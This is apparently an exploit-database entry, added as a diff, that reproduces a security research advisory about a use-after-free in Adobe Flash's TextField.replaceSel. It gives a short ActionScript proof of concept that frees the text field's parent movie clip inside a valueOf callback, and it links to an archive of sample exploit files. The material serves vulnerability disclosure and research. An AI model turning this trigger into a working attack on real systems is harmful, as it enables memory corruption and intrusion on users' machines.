@@ -1,0 +1,26 @@
+Source: https://code.google.com/p/google-security-research/issues/detail?id=585
+
+There is a use-after-free in TextField.replaceSel. If the string parameter of the method is set to an object with toString defined, this method can delete the TextField's parent, leading to a use-after-free.
+
+A minimal PoC is as follows:
+
+var mc = this.createEmptyMovieClip("mc", 101);
+var tf = mc.createTextField("tf", 102, 1, 1, 100, 100);
+tf.replaceSel({valueOf : func});
+
+function func(){
+
+	mc.removeMovieClip();
+
+        // Fix heap here
+
+	return "text";
+	
+	}
+
+A sample swf and fla are attached.
+
+
+Proof of Concept:
+https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39047.zip
+
